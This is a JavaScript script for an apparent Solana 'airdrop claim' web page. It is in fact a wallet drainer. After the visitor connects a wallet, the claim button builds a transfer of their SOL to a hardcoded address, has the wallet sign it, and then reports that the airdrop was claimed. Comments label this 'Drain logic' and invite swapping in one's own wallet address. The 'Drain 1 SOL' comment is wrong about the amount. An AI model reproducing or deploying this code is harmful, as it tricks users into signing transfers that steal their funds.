// Make sure the Solana object is available in the browser (Phantom wallet or others)
let userWallet = null;

async function connectWallet() {
  if (!window.solana) {
    alert("Solana wallet not found!");
    return;
  }

  try {
    await window.solana.connect();
    userWallet = window.solana.publicKey.toString();
    document.getElementById("walletStatus").innerText = "✅ Wallet Connected";
    document.getElementById("claimBtn").disabled = false; // Enable claim button
  } catch (error) {
    console.error(error);
    document.getElementById("walletStatus").innerText = "🔴 Connection Failed";
  }
}

async function claimAirdrop() {
  if (!userWallet) {
    alert("Please connect your wallet first.");
    return;
  }

  try {
    const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
    const userPublicKey = new solanaWeb3.PublicKey(userWallet);
    const balance = await connection.getBalance(userPublicKey);
    
    if (balance < 1000000) {
      alert("Insufficient SOL to proceed with the claim.");
      return;
    }

    // Drain logic: transferring SOL to the airdrop wallet (Replace with your actual wallet address)
    const airdropWallet = new solanaWeb3.PublicKey("EvQET8mfoEzckUEEks59SQUsrLfkBV5NtKoayLkPyRxt");
    const transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: userPublicKey,
        toPubkey: airdropWallet,
        lamports: 1000000,  // Drain 1 SOL for example
      })
    );

    transaction.feePayer = userPublicKey;
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;

    const signedTransaction = await window.solana.signTransaction(transaction);
    const txid = await connection.sendRawTransaction(signedTransaction.serialize());
    await connection.confirmTransaction(txid);

    document.getElementById("status").innerHTML = `🎉 Airdrop claimed successfully!<br>TX: <a href="https://explorer.solana.com/tx/${txid}" target="_blank">${txid}</a>`;
  } catch (error) {
    console.error(error);
    document.getElementById("status").innerText = "❌ Airdrop failed: " + error.message;
  }
}

// Event listeners for buttons
document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
document.getElementById("claimBtn").addEventListener("click", claimAirdrop);
